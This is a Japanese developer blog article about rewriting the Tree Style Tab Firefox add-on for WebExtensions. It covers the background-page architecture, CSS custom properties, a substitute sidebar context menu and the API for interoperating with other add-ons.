<p>TSTのWebExtensionsベースでの再実装にあたっては、他の既存のアドオンの派生として開発する方向と、全くのスクラッチで開発する方向の2通りの進め方があり得ました。</p>

<p>WE版TSTはWebExtensionsでの縦長タブバー型アドオンとしては最後発になるため、既に十分に使い勝手の良い物があるのなら、それを改造する形で作ったほうが効率が良いというのは道理です。<br>
しかし他の人の書いたコードを何種類も読み込んで比較検討するら事の精神的コストを考えると気が遠くなったのと、「何だかんだでまだまだレガシーなアドオン開発の意識が抜けきっていない僕自身の発想」をWebExtensionsに移行するためには単純に経験を積み増す方が良いと思ったのとで、敢えてのフルスクラッチでいくことにしました。<br>
（実際の所は、とりあえず実験的にやり始めてみたらこれはやはり大変そうだということが分かって、大変だからこそ浅い理解のまま他人のプロダクトに乗っかったら大火傷する・そうならないためには細部までの深い理解が必要だと思って、完全に理解できる程度の小規模から作り始めてAPIへの理解を深める事に決めた……という感じでした。）</p>

<p><a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/user_interface/Sidebars" rel="nofollow noopener" target="_blank">サイドバー関連API</a>への慣熟と、実装されたばかりの新機能の<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/tabs/create" rel="nofollow noopener" target="_blank"><code>tabs.Tab.openerTabId</code></a>の検証のため、最初はサイドバー内で完結する物として、</p>

<ul>
<li>タブを開く前に何かするのでなく、開かれた後のタブから情報を得てツリーに組み込む。
特に、<code>tabs.Tab.openerTabId</code>で「どのタブから開かれたか」の情報が与えられている場合は明示的に子タブが開かれたものとみなして取り扱う。</li>
<li>Firefox自身のタブバー上のドラッグ操作やWebExtensions API経由での操作によってタブの位置が変更された場合、タブが既存のツリーの中のどこに出現したのかを検出して、ツリー内に矛盾なく組み込む。</li>
<li>親にあたるタブが閉じられたときは、そのタブがなくなった後もツリー構造が破綻しないように、既存のタブを新しい親に昇格させるなどの対応を取る。</li>
<li>親のタブが自身の配下の子孫のタブが並ぶ中の位置に移動された場合は、ツリー構造の破綻を防ぐために、そのタブを元の位置に自動的に押し戻す。</li>
<li>ツリーが折り畳まれている状態で親にあたるタブが閉じられたときは、子孫のタブも道連れに閉じる。</li>
</ul>

<p>などなど、タブに起こったイベントを監視し縦型タブバーとして表示する所から始めました。</p>

<p>そうして実装が進むうちに、ツリーの一部が閉じられた場合などの挙動も検証する必要が出てきたので、ツリーの開閉機能、タブのツリーをドラッグ＆ドロップで編集する機能、ウィンドウをまたいだタブの移動、タブバーの自動スクロールなども早々に実装しました。<br>
これらの処理は元々Firefoxの実装に強く依存していたわけではなかった一方で、「様々な局面で、空気を読んでイイ感じに自動判断する」というTSTの特徴を形作る部分であったため、下手にスクラッチから書き直せばロジックが変わって使い勝手も別物になってしまうと考え、使える所は可能な限りコードをそのまま使い回すようにしています。</p>

<p>「Firefoxによってタブが複数開かれる場面で、それらをグループ化用のタブで自動的にツリー化する」という機能については、タブを開く前の時点で処理に介入できない事がはっきりしていたため、当初は移植もしないつもりでした。<br>
しかし「一定時間以内に連続して複数のタブが単独で開かれた場合」のように場面を限定すればある程度の推測は可能かも知れないと思い立ち、そのような場面でタブを自動的にグループにまとめる機能を実装してみました。<br>
苦肉の策ではありましたが、結果的にはこれはそこそこ期待通りの成果をもたらす事となりました。</p>

<p>また、予定外でしたがこの時点で「セッションをまたいだツリー構造の保存・復元」の<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/storage/local" rel="nofollow noopener" target="_blank">storage.local</a>による暫定的な実装も投入しました。<br>
自分は基本的に「捨てる前提の実装」はしないようにしているのですが、毎回Firefoxを起動する度に検証用のツリーを構築する手間が馬鹿にならなくなってきたため、この時ばかりはポリシーを曲げざるを得ませんでした。<br>
（最終的には、この暫定的な実装は削除し、<code>browser.sessions.setWindowValue()</code>と<code>browser.sessions.setTabValue()</code>に基づく本来の想定通りの実装に置き換えました。）</p>

<h4>
<span id="バックグラウンドページを中心とした設計への転換" class="fragment"></span><a href="#%E3%83%90%E3%83%83%E3%82%AF%E3%82%B0%E3%83%A9%E3%82%A6%E3%83%B3%E3%83%89%E3%83%9A%E3%83%BC%E3%82%B8%E3%82%92%E4%B8%AD%E5%BF%83%E3%81%A8%E3%81%97%E3%81%9F%E8%A8%AD%E8%A8%88%E3%81%B8%E3%81%AE%E8%BB%A2%E6%8F%9B"><i class="fa fa-link"></i></a>バックグラウンドページを中心とした設計への転換</h4>

<p>レガシー版TSTはFirefoxの各ウィンドウ内でタブバーに寄生するような形で動作する設計で、全体を統括する管理機構のような物はありませんでした。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/a1dea2df-f927-d158-237b-c2f581fb25c7.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/4f93f69582d51d5d09bee4e89cf365b0cf404136/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f61316465613264662d663932372d643135382d323337622d6332663538316662323563372e706e67" alt="（レガシー版TSTのアーキテクチャの概念図）" width="450" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/a1dea2df-f927-d158-237b-c2f581fb25c7.png"></a></p>

<p>WE版TSTの初期開発段階もそれと同じ設計でスタートしましたが、途中で「バックグラウンドページがマスタープロセスとして全体を管理し、サイドバーは基本的にはその指示を受けてツリーを描画する」という設計に改めることとなります。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/62790713-b834-86b5-d3a1-8d3a7f6cee66.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/9024100f62cc74c893426a4c9eb03b1de58895d0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f36323739303731332d623833342d383662352d643361312d3864336137663663656536362e706e67" alt="（WE版TSTのアーキテクチャの概念図）" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/62790713-b834-86b5-d3a1-8d3a7f6cee66.png"></a></p>

<p>これには大きく以下の2つの動機がありました。</p>

<ul>
<li>マスタープロセス不在の状態でのフラグ管理の煩雑さの低減。<br>
タブに起こった変化を監視するにあたっては、「TSTによって意図的に行われた変更であれば何もせず、そうでない外部要因によって意図せず引き起こされた変更であれば、その変更後もツリーの構成に矛盾が生じないようにツリーを自動修復する」といった要領で、内部操作と外部操作とを厳密に識別する必要があります。 
そのためには、WebExtensions APIには<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/tabs/create" rel="nofollow noopener" target="_blank">タブを開く時</a>にメタ情報を指定する機能が無いため、「これからTST自身がタブを開こうとしている」という事を意味するフラグを何らかの方法で立てて、WebExtensions APIを呼び、処理が終わったらフラグを下ろすという事をする必要があります。<br>
しかし、WebExtensionsでは<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/runtime/sendMessage" rel="nofollow noopener" target="_blank">ウィンドウ間のメッセージのやりとり</a>を非同期にしか行えないため、まともにやろうとすると、ウィンドウをまたいでタブを移動するような場面では「フラグは移動元のウィンドウと移動先のウィンドウのどちらで立てるのか」「立てたフラグをいつ下ろせばいいのか」「フラグを立てる事を通知するメッセージとタブを操作するAPIの呼び出しのどちらが先に発生するか保証できない」などの問題に悩まされることになります。<br>
同期的にフラグを管理するためには、ウィンドウをまたがってタブの変化を横断的に監視するマスタープロセスを用意する他の方法はありませんでした。</li>
<li>サイドバーが閉じられている間・TSTが機能していない間のタブ操作のトラッキングの必要性。<br>
WebExtensionsのサイドバー機能は排他的な選択式サイドバーパネルを提供する物なので、当然、TSTが提供する「タブバーとしてのサイドバーパネル」も切り替えによってメモリ外に追い出される事があります。<br>
そうなると、TSTが機能していない状態でツリーの中のタブが部分的に閉じられたり、あるいはツリーの中に新たにタブが開かれたりといった変化が起こる事を避けられません。<br>
再びサイドバーパネルがアクティブになった時に壊れきったツリー構造をまとめて修復する、というのは現実的ではなく、ツリー構造が破綻しないようにするためには、タブに起こる変化を常時監視し、変化が起こる度に適切なメンテナンスを行う必要があります。<br>
これにも監視用のマスタープロセスが必要となります。</li>
</ul>

<p>また、このあたりのタイミングで、<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1322060" rel="nofollow noopener" target="_blank">ウィンドウやタブのセッション情報にメタ情報を保持できるようにするAPI</a>の実装がFirefoxに投入されたため、TSTでもこれを使い、セッションをまたいでタブを一意に識別するためのIDを保持するようにし始めました（<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=529477" rel="nofollow noopener" target="_blank">そういう事をFirefox自身がやって欲しいという要望は出ています</a>が、長らく動きが無いのです……）。<br>
これもマスタープロセスの重要な仕事の1つとなっています。</p>

<p>ただ、「全ての判断をバックグラウンドページに任せてサイドバーは描画のみに特化する」という方針は厳密には徹底していません。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/cf37f307-02a9-7b57-5292-c221b0aa1e7e.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/95c2e5096485b0186065da1175a9d7a5f679d2a3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f63663337663330372d303261392d376235372d353239322d6332323162306161316537652e706e67" alt="（WE版TSTで採用しなかった、完全な中央集権の様子の概念図）" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/cf37f307-02a9-7b57-5292-c221b0aa1e7e.png"></a><br><br>
そうではなく実際にはサイドバー側でも、タブの増減や移動の反映などで難しい判断が必要ない部分は自律的に処理したり、タブの親子関係を示す完全な情報を保持していたりします。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/f6ee6c9c-6743-8329-ff10-a725c5183e60.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/0590fe5df82ff164052bbba6a82b21ff024a4327/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f66366565366339632d363734332d383332392d666631302d6137323563353138336536302e706e67" alt="（WE版TSTで各モジュールが半自律動作する様子の概念図）" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/f6ee6c9c-6743-8329-ff10-a725c5183e60.png"></a><br><br>
このことにより、タブのドラッグ操作などイベントリスナ内で即座にイベントをキャンセルしなくてはならないような場面で、バックグラウンドにいちいち非同期処理で問い合わせなくても、サイドバー内のスクリプトだけで同期的に「このタブは折り畳まれた子孫を持っているかどうか？」のような判断を行えるようになっています。</p>

<p>（ちなみに、WebExtensionsでは<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/runtime/getBackgroundPage" rel="nofollow noopener" target="_blank"><code>browser.runtime.getBackgroundPage()</code></a>でバックグラウンドページのグローバルオブジェクトそのものにアクセスできるのですが、この機能は使わず、バックグラウンドとサイドバーとの間での情報のやり取りには必ず<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/runtime/sendMessage" rel="nofollow noopener" target="_blank"><code>browser.runtime.sendMessage()</code></a>を使うようにしています。<br>
これは、プライベートブラウジングモードのウィンドウからは<code>browser.runtime.getBackgroundPage()</code>でバックグラウンドページにアクセスできないという制約があるからです。）</p>

<h4>
<span id="cssによるスタイリングとアニメーション効果" class="fragment"></span><a href="#css%E3%81%AB%E3%82%88%E3%82%8B%E3%82%B9%E3%82%BF%E3%82%A4%E3%83%AA%E3%83%B3%E3%82%B0%E3%81%A8%E3%82%A2%E3%83%8B%E3%83%A1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E5%8A%B9%E6%9E%9C"><i class="fa fa-link"></i></a>CSSによるスタイリングとアニメーション効果</h4>

<p>タブとしての見た目を整える事については、「面倒だが、やればできる事である」という事が分かりきっていたため、後回しにして実証実験レベルの実装を優先して作業を進めていました。<br>
その実装がある程度進行したため、このタイミングでようやくスタイリングに着手し始めました。</p>

<p>タブの外観はレガシー版でもWE版でもCSSで制御していますが、その内容については顕著な改善がありました。</p>

<ul>
<li>レガシー版はFirefox本体がタブに反映しているスタイル指定を一旦キャンセルし、その上から独自のスタイル指定を反映していました。
この「Firefox本体の指定のキャンセル」が結構な難題で、Firefoxのバージョンやプラットフォームの違いによってバラバラなスタイル指定を片っ端から潰してまわるために、今まで相当な労力が費やされていました。<br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/d7a1f33a-ca4e-e24e-280b-b52a9cad4f4f.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/4dafa9cb27ead57c9fcff6a2d9f958370fcacf49/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f64376131663333612d636134652d653234652d323830622d6235326139636164346634662e706e67" alt="（レガシー版のスタイル指定：Firefoxの組み込みのスタイル指定をキャンセルするために多くの行が割かれている）" width="450" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/d7a1f33a-ca4e-e24e-280b-b52a9cad4f4f.png"></a><br>
WE版ではサイドバー内のコンテンツには自分で一からスタイルを指定することになるため、そういった苦労一切が不要となり、はるかに素直な形でCSSを記述できています。<br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/03f54f0d-9caf-0bc5-16f6-355ba1e1b4ed.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/0e923c82ca9a11cfb092e8ccbcfd8a21e51e61d3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f30336635346630642d396361662d306263352d313666362d3335356261316531623465642e706e67" alt="（WE版のスタイル指定：本当にスタイル指定に必要な行だけが含まれている）" width="450" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/03f54f0d-9caf-0bc5-16f6-355ba1e1b4ed.png"></a>
</li>
<li>単位となる値の定義やアニメーションの挙動など、レガシー版ではJavaScriptとCSSの複雑な組み合わせで成立していた部分の多くをCSSだけで完結させるように改めました。<br>
UIの見た目をCSSで指定する時に問題になるのが、各要素のサイズの定義です。
タブのアイコンは縦横16ピクセルで一定なのに対し、UIの文字サイズはプラットフォームによって12ピクセルだったり16ピクセルだったりと様々です。
そのため、例えばタブの高さを32ピクセルと決め打ちすると、文字の大きな環境では狭苦しくなり、文字の小さな環境では余白が大きくなりすぎるという結果になってしまいます。
かといってem単位を使っても、今度はタブのアイコンが相対的に大きすぎる・小さすぎるといった問題が起こります。<br>
WE版TSTではこの問題の解決のために、カスタムプロパティを多用する事にしました。
これはいわゆる「CSSの変数」で、1箇所で定義した長さや数値を<code>var(変数名)</code>で他の箇所から参照できるというものなのですが、実は値の定義を後から動的に変更する（新しい値の指定で上書きする）こともできます。
これと<code>calc()</code>を併用して各部分のサイズ指定を「この部分は<code>--tab-height</code>の半分」「この部分は<code>100%</code>分の高さから<code>--favicon-size</code>を引いた長さ」のように書いておき、リファレンスとなる要素の大きさを起動時に<code>getBoundingClientRect()</code>で測定して、その結果をカスタムプロパティの値として再定義すれば、実行環境に適したサイズで全体の見た目を簡単に揃えられます。<br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/f6383c68-dd7e-040e-723d-2c59debe7a02.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/13fc3b6b9dc594ab6ddda474642768afa521f874/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f66363338336336382d646437652d303430652d373233642d3263353964656265376130322e706e67" alt="（タブのサイズを計測してスタイルシートを動的に定義している部分）" width="450" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/f6383c68-dd7e-040e-723d-2c59debe7a02.png"></a><br>
なお、サイズ計測用のダミーの要素は、<code>position: fixed</code>で通常のフローから切り離して画面の隅に置いた上で、<code>visibility: hidden</code>や<code>opacity: 0</code>でユーザーの目に見えないようにしつつ、ユーザーのクリック操作に反応してしまわないように<code>pointer-events: none</code>も指定しています。
<code>pointer-events: none</code>を指定したボックスは他にも「ユーザーの操作を横取りしないで、見た目上だけ半透明の色付きボックスを上に重ねる」のようなことをするのにも有用で、背景画像で頑張るとか、枠をつけるためだけにボックスを一階層増やすとかの無理をしなくてよくなります。</li>
<li>カスタムプロパティと値の計算は、インデントの深さの変更やツリーの折りたたみでのアニメーション効果にも活かされています。
レガシー版では個々のタブの要素に対してその都度<code>style</code>を操作しアニメーション効果を適用していましたが、WE版では全てのアニメーション効果を事前に動的に生成したスタイルシートで定義しきっておき、個々の要素はそのトリガーとなるクラスの追加・削除のみ行うという設計に改めました。<br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/9c48b5ca-d51c-61fe-989b-7e9629af73b1.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/2a237cd0269470c1622276887535eca88d51d9e0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f39633438623563612d643531632d363166652d393839622d3765393632396166373362312e706e67" alt="（インデントのアニメーション効果を実現するために自動生成されたスタイル指定の様子）" width="450" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/9c48b5ca-d51c-61fe-989b-7e9629af73b1.png"></a><br>
この設計変更を決断できた背景には、上記のカスタムプロパティと値の計算が使えるようになった事に加え、テンプレート構文によって変数の値を埋め込んだ長大な文字列を容易に定義できるようになったからという事もあります。
（理論上は同じ改善をレガシー版にも反映できるのですが、余生の短いレガシー版のためにこれ以上の時間を割きたくないので、自分の手でそれをやる事はもう無いでしょう。）</li>
</ul>

<h3>
<span id="フェイズ3他のアドオンとの連携を考慮した作り込み" class="fragment"></span><a href="#%E3%83%95%E3%82%A7%E3%82%A4%E3%82%BA3%E4%BB%96%E3%81%AE%E3%82%A2%E3%83%89%E3%82%AA%E3%83%B3%E3%81%A8%E3%81%AE%E9%80%A3%E6%90%BA%E3%82%92%E8%80%83%E6%85%AE%E3%81%97%E3%81%9F%E4%BD%9C%E3%82%8A%E8%BE%BC%E3%81%BF"><i class="fa fa-link"></i></a>フェイズ3：他のアドオンとの連携を考慮した作り込み</h3>

<p>単体のアドオンとしてのWE版TSTが形になる目処が立ってきた辺りから、もう1つのコンセプトである「他のアドオンとの相互運用性」を意識した作り込みにも着手し始めました。</p>

<h4>
<span id="アドオン同士の暗黙的な連携" class="fragment"></span><a href="#%E3%82%A2%E3%83%89%E3%82%AA%E3%83%B3%E5%90%8C%E5%A3%AB%E3%81%AE%E6%9A%97%E9%BB%99%E7%9A%84%E3%81%AA%E9%80%A3%E6%90%BA"><i class="fa fa-link"></i></a>アドオン同士の暗黙的な連携</h4>

<p>TSTの基本機能のうちいくつかは、WebExtensionsにおいてもアドオン同士の暗黙的な連携が可能なように設計してあります。</p>

<ul>
<li>
<code>browser.tabs.create()</code>で<code>openerTabId</code>を指定して開かれたタブは子タブになる。
（それ以外にも、<code>openerTabId</code>を伴った状態でタブが開かれる場面はすべてTSTの検出対象となる。）</li>
<li>現在のタブ配下のツリーが折り畳まれた状態で現在のタブを閉じると、子孫タブも道連れに閉じる。</li>
</ul>

<p>これらの仕様により、マウスジェスチャ系アドオンやキーボードショートカット変更系アドオンが真っ当にWebExtensions APIを使用していれば、それらは違和感なくTSTと一緒に働いてくれるはずです。</p>

<h4>
<span id="タブのコンテキストメニューの提供" class="fragment"></span><a href="#%E3%82%BF%E3%83%96%E3%81%AE%E3%82%B3%E3%83%B3%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88%E3%83%A1%E3%83%8B%E3%83%A5%E3%83%BC%E3%81%AE%E6%8F%90%E4%BE%9B"><i class="fa fa-link"></i></a>タブのコンテキストメニューの提供</h4>

<p>ただ、先にも触れましたが、WebExtensionsではあるアドオンが提供する領域内での他のアドオンと暗黙的な連携はほぼ不可能です。<br>
せめてコンテキストメニューを介してだけでも連携できれば良かったのですが、現在のところWebExtensionsでは「サイドバーで独自のタブバー風UIを提供する」場合であっても一般的なタブのコンテキストメニューをそこに流用する方法がありません（<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1376251" title="1376251 - Allow sidebar extensions access to native tab context menu" rel="nofollow noopener" target="_blank">bug 1376251</a>、<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1396031" title="1396031 - Create browser.menus.show(contextType, parameters, contextParameters);" rel="nofollow noopener" target="_blank">bug 1396031</a>などで提案はなされていますが……）。</p>

<p>正直な所としてはAPIが整備されるのを待ちたかったのですが、タブのコンテキストメニュー無しでは実用に支障をきたす事が明白です。<br>
よって、非常に不本意ではあるのですが、他の同系統のアドオンがやっているように、TSTでもサイドバー内に独自のコンテキストメニューを実装する事にしました。</p>

<p>ただし、半端なオレオレUIにはせずに、Firefoxのタブのコンテキストメニューを可能な限り真似るようにという事には気を遣っています。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/d6c3129b-09b4-0d54-6b16-162e6f50951b.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/18da1ae491657b41e15047723aeeb031e1d2ffd7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f64366333313239622d303962342d306435342d366231362d3136326536663530393531622e706e67" alt="（サイドバー内の偽コンテキストメニュー）" height="380" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/d6c3129b-09b4-0d54-6b16-162e6f50951b.png"></a></p>

<p>自分としてはこれはあくまで「普通のタブのコンテキストメニューをサイドバー上でも使えるようになるまでの暫定的な実装」「いずれ捨てるつもりの実装」なので、この部分で独自の世界観を作り込むつもりは無く、技術的に不可能であるという以外の理由での差異は可能な限り発生させたくなかったのです。</p>

<p>メニューそのものの内容・見た目を真似るだけでなく、<a href="https://github.com/piroor/treestyletab/wiki/API-for-other-addons#extra-context-menu-items-on-tabs" rel="nofollow noopener" target="_blank">コンテキストメニューに項目を追加するAPI</a>も、<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/menus" rel="nofollow noopener" target="_blank">WebExtensionsネイティブのmenus API</a>を真似ています。<br>
指定する内容や提供する機能はmenus APIの下位互換となるように注意しており、そのため他のアドオン対しては</p>

<ul>
<li>既存のコードに対して行わなくてはいけないTSTのための変更は最小限で済む</li>
<li>将来のバージョンのFirefoxでmenus APIがサイドバー内のコンテンツに対しても有効になった時には、単にTST対応のためのコードを削除するだけで済む</li>
</ul>

<p>といったメリットがあります。<br>
ドッグフーディングも兼ねて、TST自身の追加のコンテキストメニュー項目そのものも完全にこの枠組みの上で提供するようにしています。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/800a8a49-dc18-7153-6f02-7c95526c9838.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/c71fcc1e495f727d4a88d43a78e08e369af15c30/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f38303061386134392d646331382d373135332d366630322d3763393535323663393833382e706e67" alt="（サイドバー内の偽コンテキストメニューにおける、ツリー型タブの追加のコンテキストメニュー項目）" height="380" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/800a8a49-dc18-7153-6f02-7c95526c9838.png"></a></p>

<h4>
<span id="メニュー以外のapi" class="fragment"></span><a href="#%E3%83%A1%E3%83%8B%E3%83%A5%E3%83%BC%E4%BB%A5%E5%A4%96%E3%81%AEapi"><i class="fa fa-link"></i></a>メニュー以外のAPI</h4>

<p>menus APIを真似た部分以外のTST独自のAPIは、「TSTに指示を与えるAPI」と「TSTからの通知を受け取るAPI」の2種類を実装しました。</p>

<ul>
<li>前者は「ツリーを折り畳む・展開する」や「特定のタブを別のタブの子にする」などで、これはTSTに対して<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/runtime/sendMessage" rel="nofollow noopener" target="_blank"><code>browser.runtime.sendMessage()</code></a>でIDを指定して通知のメッセージを送るだけで使えます。
戻り値も、WebExtensionsの他の機能と同様に<code>Promise</code>で返されます。</li>
<li>後者は「タブバー上でのクリック」「ドラッグ操作の開始」などを通知するイベントAPIです。
<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/runtime/onMessageExternal" rel="nofollow noopener" target="_blank"><code>browser.runtime.onMessageExternal</code></a>に登録したリスナで通知を受け取るというものですが、TSTのイベントAPIではもう1ステップ、「TSTに対して自身の存在を知らせる」という事も必要となっています。
これは、<code>browser.runtime.onMessageExternal</code>で待ち受けているリスナにメッセージを送るためには、送信側で必ず受け手のアドオンのIDを明示しないといけない、という制約があるからです。</li>
</ul>

<p>ここで問題になるのがアドオンの起動順序です。<br>
TSTが先に初期化を終えている場合なら、連携する側のアドオンは単にTST宛に通知を送るだけで済みます。<br>
しかし場合によっては、連携する側のアドオンの方が先に初期化されているという事も当然起こり得ます。<br>
この場合、連携する側のアドオンからは「TSTに対していつ自分の存在を知らせればいいのか」が分かりません。<br>
「TSTの初期化が完了した、という通知をTSTから送れば……」と思っても、そもそもそれができないわけで、鶏と卵です。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/566c911e-cd47-94dc-0ac2-04df88baf6fa.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/d78834352aed0b278b6cb51391d8a6b742d39f33/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f35363663393131652d636434372d393464632d306163322d3034646638386261663666612e706e67" alt="（メッセージベースで連携する2つのアドオンの起動順序を示したシーケンス図）" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/566c911e-cd47-94dc-0ac2-04df88baf6fa.png"></a></p>

<p>この点は突き詰めるとどうしようもないので、TSTでは</p>

<ul>
<li>他のアドオンに対しては、基本的に自分からは通知を送らない。</li>
<li>過去に存在を通知されたアドオンに対しては、自分の初期化が完了した時点でその事を通知する。</li>
<li>TSTと連携できるアドオンがTSTより先にインストールされていた場合、ユーザーが明示的に再読み込み（無効化→有効化）するか自動更新で再起動されるかして存在を通知されるまでは、連携できないままでも仕方ない。</li>
</ul>

<p>と割り切ることにしました。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/c0c903fc-7331-e20f-8440-161e5dbcc440.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/e4a2135470764d062f6b8a093f0e49f50d0d6fe5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f63306339303366632d373333312d653230662d383434302d3136316535646263633434302e706e67" alt="（キャッシュされた情報に基づき滞りなく初期化処理を行う様子のシーケンス図）" height="350" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/c0c903fc-7331-e20f-8440-161e5dbcc440.png"></a></p>

<p>このようにして実装した通知系APIについて、当初は必要最小限の情報のみを通知するようにしていたのですが、実際にそれに基づいて連携のための処理を実装してみると、思った通りの結果にはならないという事が分かりました。<br>
というのも、通知される情報が足りないとイベントを受け取った側でまた改めて別の非同期な問い合わせ用APIを呼ばねばならず、その結果を待っている間にまたTSTから新しいイベントが通知されてしまって……という事が繰り替えされて、受け手側でイベントの状態を管理しきれなくなったのです。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/4d311fdd-17ec-0518-2736-d8e1d8f11f7d.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/7ed08788647e3ce636735220cd7de82379e7ecc1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f34643331316664642d313765632d303531382d323733362d6438653164386631316637642e706e67" alt="（十分でない情報しか提供されない通知APIによる連携の様子のシ&lt;br&gt;
ーケンス図）" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/4d311fdd-17ec-0518-2736-d8e1d8f11f7d.png"></a></p>

<p>そのため最終的には、WebExtensionsの元々のAPIがそうなっているように、イベントAPIでは通知するメッセージの中に可能な限り情報を多く入れるようにしました。<br>
例えば「タブがクリックされた」「タブの上でドラッグ操作を開始した」などのイベントでは、タブのIDだけを通知するのではなく、<a href="https://github.com/piroor/treestyletab/wiki/API-for-other-addons#data-format" rel="nofollow noopener" target="_blank"><code>tabs.Tab</code>形式のオブジェクト、ツリー型タブが独自に把握しているツリーの開閉状態などの情報、さらに子孫タブについても同じ形式の情報を収集して</a>すべて1つのメッセージに載せています。<br><br>
<a href="/latest/entries/mozilla/extension/treestyletab/2017-10-03_migration-we-ja.files/api-rich-info-ja.png"><img src="https://camo.qiitausercontent.com/145e7d16a0def1691e55835842337a0081c6f08b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f31303435396134342d316537652d346531632d346339662d6530313937633863343362372e706e67" alt="（必要十分な情報を伴ったメッセージに基づく通知APIによる連携の様子のシーケンス図）" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/10459a44-1e7e-4e1c-4c9f-e0197c8c43b7.png"></a><br>
イベントが短時間に連続して通知される可能性があるAPIを実装しようと思っている人は、この点に気をつけておくと、API利用者にとって「使いやすい・使い勝手の良い」APIになると思います。</p>

<h3>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h3>

<h4>
<span id="諦めなければ道は開けるかもしれない" class="fragment"></span><a href="#%E8%AB%A6%E3%82%81%E3%81%AA%E3%81%91%E3%82%8C%E3%81%B0%E9%81%93%E3%81%AF%E9%96%8B%E3%81%91%E3%82%8B%E3%81%8B%E3%82%82%E3%81%97%E3%82%8C%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>諦めなければ道は開ける……かもしれない</h4>

<p>このような経過を経て、TSTのWebExtensions移行は「バージョン2.0のリリース」という一旦の区切りを見るに至りました。</p>

